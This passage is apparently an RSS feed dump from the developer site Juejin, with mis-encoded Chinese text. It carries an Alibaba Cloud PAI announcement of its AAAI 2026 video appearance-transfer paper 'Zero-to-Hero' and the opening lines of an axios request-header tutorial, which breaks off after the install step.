</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€AAAI2026ã€‘é˜¿é‡Œäº‘äººå·¥æ™ºèƒ½å¹³å°PAIè§†é¢‘ç¼–è¾‘ç®—æ³•è®ºæ–‡å…¥é€‰]]></title>    <link>https://juejin.cn/post/7604493165328089122</link>    <guid>https://juejin.cn/post/7604493165328089122</guid>    <pubDate>2026-02-09T09:32:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604493165328089122" data-draft-id="7604315965875650594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€AAAI2026ã€‘é˜¿é‡Œäº‘äººå·¥æ™ºèƒ½å¹³å°PAIè§†é¢‘ç¼–è¾‘ç®—æ³•è®ºæ–‡å…¥é€‰"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-09T09:32:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€AAAI2026ã€‘é˜¿é‡Œäº‘äººå·¥æ™ºèƒ½å¹³å°PAIè§†é¢‘ç¼–è¾‘ç®—æ³•è®ºæ–‡å…¥é€‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘å¤§æ•°æ®AIæŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:32:09.000Z" title="Mon Feb 09 2026 09:32:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘æœŸï¼Œé˜¿é‡Œäº‘äººå·¥æ™ºèƒ½å¹³å° PAI çš„è§†é¢‘ç¼–è¾‘ç®—æ³•è®ºæ–‡åœ¨ AAAI2026 ä¸Šæ­£å¼äº®ç›¸å‘è¡¨ï¼ˆZero-to-Hero: Empowering Video Appearance Transfer with Zero-Shot Initialization and Holistic Restorationï¼‰ã€‚AAAI æ˜¯äººå·¥æ™ºèƒ½é¢†åŸŸæœ€å…·å½±å“åŠ›çš„å›½é™…é¡¶çº§ä¼šè®®ä¹‹ä¸€ï¼Œæ—¨åœ¨ä¸ºç ”ç©¶äººå‘˜ã€å·¥ç¨‹å¸ˆä¸äº§ä¸šç•Œä¸“å®¶æä¾›äº¤æµå¹³å°ï¼Œå±•ç¤ºåœ¨æœºå™¨å­¦ä¹ ã€è®¡ç®—æœºè§†è§‰ä¸ç”Ÿæˆå¼ AI ç­‰æ–¹å‘çš„æœ€æ–°ç ”ç©¶æˆæœä¸åº”ç”¨è¿›å±•ã€‚æ­¤æ¬¡å…¥é€‰æ ‡å¿—ç€é˜¿é‡Œäº‘äººå·¥æ™ºèƒ½å¹³å° PAI åœ¨è§†é¢‘ç¼–è¾‘ç®—æ³•æ–¹é¢çš„ç ”ç©¶è·å¾—äº†å­¦æœ¯ç•Œçš„å……åˆ†è®¤å¯ã€‚</p>
<p>è§†é¢‘ç¼–è¾‘çš„ç›®æ ‡æ˜¯æ ¹æ®ç”¨æˆ·éœ€æ±‚å¯¹ç›®æ ‡è§†é¢‘è¿›è¡Œä¿®æ”¹ï¼Œå…¶ä¸­â€œå¤–è§‚ç¼–è¾‘â€æ˜¯ä¸€ç±»å…³é”®ä»»åŠ¡ï¼šåœ¨å°½å¯èƒ½ä¿ç•™è§†é¢‘ç»“æ„ä¸è¿åŠ¨æ¨¡å¼çš„å‰æä¸‹ï¼Œæ”¹å˜ç›®æ ‡ä¸»ä½“çš„é¢œè‰²ã€çº¹ç†æˆ–æ•´ä½“é£æ ¼ã€‚è¿‡å¾€ä¸»æµæ–¹æ³•å¤šé‡‡ç”¨æ–‡æœ¬æç¤ºï¼ˆpromptï¼‰å¼•å¯¼ç¼–è¾‘ï¼Œä½†æ–‡æœ¬è¡¨è¾¾å¾€å¾€å­˜åœ¨æ­§ä¹‰ï¼Œä¸”éš¾ä»¥ç²¾ç¡®æè¿°ç»†ç²’åº¦å¤–è§‚ï¼ˆä¾‹å¦‚å¤æ‚é…è‰²ã€å±€éƒ¨çº¹ç†å¸ƒå±€ç­‰ï¼‰ï¼Œä»è€Œé™åˆ¶äº†ç”¨æˆ·å¯¹ç¼–è¾‘ç»“æœçš„ç²¾ç»†æ§åˆ¶ã€‚å› æ­¤ï¼Œæ›´ç¬¦åˆçœŸå®åˆ›ä½œæµç¨‹çš„æ–¹æ¡ˆæ˜¯â€œå‚è€ƒå›¾é©±åŠ¨çš„è§†é¢‘ç¼–è¾‘â€ï¼šç”¨æˆ·å…ˆå¯¹æŸä¸€å¸§è¿›è¡Œç²¾ä¿®ï¼Œå¾—åˆ°ç†æƒ³å¤–è§‚çš„å‚è€ƒå›¾ï¼ˆå¯é€šè¿‡ Photoshopã€ComfyUI æˆ–ä»»æ„å›¾åƒç¼–è¾‘å·¥å…·å®Œæˆï¼‰ï¼Œå†å°†è¯¥å¤–è§‚ä¸€è‡´åœ°ä¼ æ’­åˆ°åç»­å¸§ä¸­ï¼ˆå¦‚å›¾1æ‰€ç¤ºï¼‰ã€‚è¿™ç±»ä»»åŠ¡å¤©ç„¶åœ°å°†é—®é¢˜æ‹†è§£ä¸ºä¸¤æ­¥ï¼šå…ˆè·å¾—é«˜è´¨é‡å‚è€ƒå¸§ï¼Œå†å®ç°è·¨å¸§å¤–è§‚ä¸€è‡´ä¼ æ’­ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/715937b599f54c9f80a525a846de8fbc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771234329&amp;x-signature=sObL7vLHEsNcUv6s12FRHtvHngg%3D" alt="" loading="lazy"/></p>
<p>å›¾1. æˆ‘ä»¬æå‡ºçš„è§†é¢‘ç¼–è¾‘ç®—æ³•ä¸ä¸»æµæ–¹æ³•çš„å¯¹æ¯”</p>
<p>å°½ç®¡å‚è€ƒå›¾é©±åŠ¨çš„è§†é¢‘å¤–è§‚ä¼ æ’­å·²æœ‰ä¸å°‘æ¢ç´¢ï¼Œä½†ç°æœ‰æ–¹æ³•ä»é¢ä¸´æ˜æ˜¾å±€é™ã€‚ä¸€ç±»æ–¹æ³•ä¾èµ–å…‰æµä¼°è®¡æ¥å¯¹é½å¹¶ä¼ æ’­å¤–è§‚ç‰¹å¾ï¼Œå…¶æ•ˆæœå®¹æ˜“å—åˆ°å…‰æµç²¾åº¦å½±å“ï¼Œåœ¨å¤§å¹…è¿åŠ¨ã€é®æŒ¡æˆ–å¤æ‚é•œå¤´å˜åŒ–ä¸‹ä¼šæ˜æ˜¾é€€åŒ–ï¼›å¦ä¸€ç±»æ–¹æ³•åŸºäºå›¾ç”Ÿè§†é¢‘ï¼ˆI2Vï¼‰æ¨¡å‹è¿›è¡Œåæ¼”ä¸å»å™ªä¼ æ’­ï¼Œä½†å¾€å¾€å—æ˜¾å­˜é™åˆ¶çº¦æŸè§†é¢‘é•¿åº¦ï¼Œä¸”è½»é‡æ—¶åºå»ºæ¨¡å¯¹å¤§è¿åŠ¨èŒƒå›´é€‚åº”ä¸è¶³ã€‚æ­¤å¤–ï¼Œè¿‘å¹´æ¥ä¸€äº›é›¶æ ·æœ¬ï¼ˆzero-shotï¼‰å¤–è§‚è¿ç§»æ–¹æ³•é€šè¿‡å¹²é¢„æ‰©æ•£æ¨¡å‹çš„æ³¨æ„åŠ›æœºåˆ¶å®ç°è·¨å¸§ä¼ æ’­ï¼Œè™½ç„¶èƒ½æå‡é²æ£’æ€§ï¼Œä½†å¾€å¾€ä¼šå¼•å…¥å¤åˆç”»è´¨é€€åŒ–ï¼Œä¾‹å¦‚æ¨¡ç³Šã€é¢œè‰²ç¼ºå¤±æˆ–è¿‡é¥±å’Œç­‰é—®é¢˜ï¼Œå¹¶ä¸”è¿™ç§é€€åŒ–ä¼šéšç€å¤šå¸§ä¼ æ’­è€Œç´¯ç§¯ã€‚</p>
<p>é’ˆå¯¹ä¸Šè¿°é—®é¢˜ï¼Œ<strong>PAI å›¢é˜Ÿæå‡ºäº†å…¨æ–°çš„ä¸¤é˜¶æ®µæ–¹æ³• Zero-to-Hero</strong>ï¼Œç”¨äºæå‡è§†é¢‘å¤–è§‚è¿ç§»çš„<strong>å‡†ç¡®æ€§ã€æ—¶åºä¸€è‡´æ€§ä¸æœ€ç»ˆç”»è´¨</strong>ã€‚Zero-to-Hero å°†â€œå¤–è§‚ä¼ æ’­â€è§£è€¦ä¸ºä¸¤ä¸ªé˜¶æ®µï¼šé¦–å…ˆç”Ÿæˆä¸€ä¸ªå¯é çš„é›¶æ ·æœ¬ä¼ æ’­åˆå§‹åŒ–ï¼ˆZero-Stageï¼‰ï¼Œå†é€šè¿‡æ•´ä½“æ€§è§†é¢‘ä¿®å¤æ¨¡å‹æå‡ç”»è´¨ï¼ˆHero-Stageï¼‰ã€‚å›¾2å±•ç¤ºäº†æˆ‘ä»¬ç®—æ³•çš„æ•´ä½“æ¡†æ¶ã€‚åœ¨ Zero-Stage ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨åŸå§‹è§†é¢‘å¸§ä¹‹é—´çš„å¯¹åº”å…³ç³»æ¥å¼•å¯¼æ‰©æ•£æ¨¡å‹çš„æ³¨æ„åŠ›ä¼ æ’­ï¼Œç›¸æ¯”ä»¥å¾€ä¾èµ–å…‰æµæˆ–é¢å¤–æ—¶åºæ¨¡å—çš„æ–¹æ¡ˆï¼Œåœ¨å¤„ç†å¤§è¿åŠ¨ç›®æ ‡æ—¶æ›´ç¨³å¥ï¼Œä»è€Œæä¾›å‡†ç¡®ä¸”æ—¶åºä¸€è‡´çš„åˆå§‹åŒ–ç»“æœã€‚ç„¶è€Œï¼Œå¯¹æ³¨æ„åŠ›æœºåˆ¶çš„å¹²é¢„ä¼šå¸¦æ¥éš¾ä»¥é¿å…çš„æ¨¡ç³Šä¸é¢œè‰²ç¼ºå¤±ç­‰é€€åŒ–ã€‚ä¸ºçªç ´è¿™ä¸€é›¶æ ·æœ¬ä¸Šé™ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥æå‡º Hero-Stageï¼šè®­ç»ƒä¸€ä¸ªé¢å‘é€€åŒ–æ¨¡å¼çš„æ¡ä»¶ç”Ÿæˆæ¨¡å‹ï¼Œå¯¹è§†é¢‘è¿›è¡Œç”»è´¨ä¿®å¤ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8a32ff24498425a80a81465726b5458~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771234329&amp;x-signature=3XfEAuUagJDd6OoRmEgYdW0lA1w%3D" alt="" loading="lazy"/></p>
<p>å›¾ 2ï¼šè§†é¢‘ç¼–è¾‘è¿‡ç¨‹ç¤ºæ„å›¾</p>
<p>å¦‚å›¾3æ‰€ç¤ºï¼ŒZero-to-Hero åœ¨ Colorization ä¸ Blender-Color-Edit ä¸¤é¡¹å¯é€å¸§è¯„æµ‹çš„ä»»åŠ¡ä¸Šå‡å–å¾—æœ€ä¼˜ç»“æœï¼ˆPSNR åˆ†åˆ«è¾¾ 28.21/26.76 dBï¼Œä¸” LPIPS æœ€ä½ã€SSIM æœ€é«˜ï¼‰ï¼ŒåŒæ—¶åœ¨ General-Edit ä¸Šä¹Ÿåœ¨é”šç‚¹å¸§æŒ‡æ ‡ä¸æ—¶åºä¸€è‡´æ€§ï¼ˆMS/SCï¼‰ä¸Šæ•´ä½“é¢†å…ˆï¼Œä½“ç°äº†æ›´ç¨³å®šçš„å¤–è§‚ä¼ æ’­ä¸æ›´é«˜çš„ç”»è´¨ä¿çœŸã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7f409b2deea495fbf2b8387a7b629c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771234329&amp;x-signature=jovLLcTsMPRw9q8GETKVL8Jwr3s%3D" alt="" loading="lazy"/></p>
<p>å›¾ 3ï¼šå®éªŒæ•ˆæœæ¦‚è§ˆ</p>
<p>å¦‚å›¾4æ‰€ç¤ºï¼Œåœ¨ General-Edit æ•°æ®é›†çš„å®šæ€§å¯¹æ¯”ä¸­ï¼ŒZero-to-Hero èƒ½æ›´å‡†ç¡®åœ°è´´åˆå‚è€ƒå¸§å¤–è§‚ï¼ŒåŒæ—¶æœ€å¤§ç¨‹åº¦ä¿æŒåŸè§†é¢‘çš„ç»“æ„ä¸è¿åŠ¨ä¸€è‡´æ€§ï¼›ç›¸æ¯”åŸºçº¿æ–¹æ³•ï¼Œç»“æœä¸­å¤–è§‚æ¼‚ç§»ä¸ç»†èŠ‚æ¨¡ç³Šç°è±¡æ›´å°‘ï¼Œæ•´ä½“è§‚æ„Ÿæ›´ç¨³å®šã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/149f529584e44f7ea2ea5d3b866a555a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771234329&amp;x-signature=gUwv8dABeA6OuADxLmFy6wXQTNY%3D" alt="" loading="lazy"/></p>
<p>å›¾ 4ï¼šZero-to-Heroä¸å…¶ä»–æ–¹æ³•ç¼–è¾‘ç»“æœç¤ºä¾‹</p>
<p><strong><strong>è®ºæ–‡ä¿¡æ¯</strong></strong></p>
<p>è®ºæ–‡åå­—ï¼šZero-to-Hero: Empowering Video Appearance Transfer with Zero-Shot Initialization and Holistic Restoration</p>
<p>è®ºæ–‡ä½œè€…ï¼šè‹å½¤å½¤ã€æ±ªè¯šæ„šã€å»–æµ·é¹ã€é»„ä¿Šã€é²ä¸œæ˜</p>
<p>è®ºæ–‡ pdf é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2505.23134" target="_blank" title="https://arxiv.org/abs/2505.23134" ref="nofollow noopener noreferrer">arxiv.org/abs/2505.23â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[axios è¯·æ±‚å¤´å°è£…è¿‡ç¨‹éµå¾ªã€Œæœ€å°å¯ç”¨ â†’ é€æ­¥å¢å¼ºã€]]></title>    <link>https://juejin.cn/post/7604493165327892514</link>    <guid>https://juejin.cn/post/7604493165327892514</guid>    <pubDate>2026-02-09T09:05:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604493165327892514" data-draft-id="7599852579066396687" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="axios è¯·æ±‚å¤´å°è£…è¿‡ç¨‹éµå¾ªã€Œæœ€å°å¯ç”¨ â†’ é€æ­¥å¢å¼ºã€"/> <meta itemprop="keywords" content="axios"/> <meta itemprop="datePublished" content="2026-02-09T09:05:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¥”è·‘è·¯ä¸Šçš„Me"/> <meta itemprop="url" content="https://juejin.cn/user/1680516363335208"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            axios è¯·æ±‚å¤´å°è£…è¿‡ç¨‹éµå¾ªã€Œæœ€å°å¯ç”¨ â†’ é€æ­¥å¢å¼ºã€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1680516363335208/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¥”è·‘è·¯ä¸Šçš„Me
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:05:56.000Z" title="Mon Feb 09 2026 09:05:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">æ­¥éª¤ 1ï¼šæç®€ç‰ˆ - åŸºç¡€å®ä¾‹ + é»˜è®¤è¯·æ±‚å¤´</h3>
<p>è¿™æ˜¯æœ€åŸºç¡€çš„å°è£…ï¼Œä»…åˆ›å»º axios å®ä¾‹å¹¶é…ç½®<strong>å›ºå®šé»˜è®¤è¯·æ±‚å¤´</strong>ï¼Œæ»¡è¶³æœ€åŸºæœ¬çš„è¯·æ±‚å¤´éœ€æ±‚ï¼Œé€‚åˆæ–°æ‰‹å…¥é—¨ã€‚</p>
<h4 data-id="heading-1">1.1 å®‰è£…ä¾èµ–</h4>
<pre><code class="hljs language-bash" lang="bash">npm install axios
<span class="hljs-comment"># æˆ– yarn add axios</span>
</code></pre>
<h4 data-id="heading-2">1.2 åŸºç¡€å°è£…ä»£ç ï¼ˆsrc/utils/request.tsï¼‰</h4>
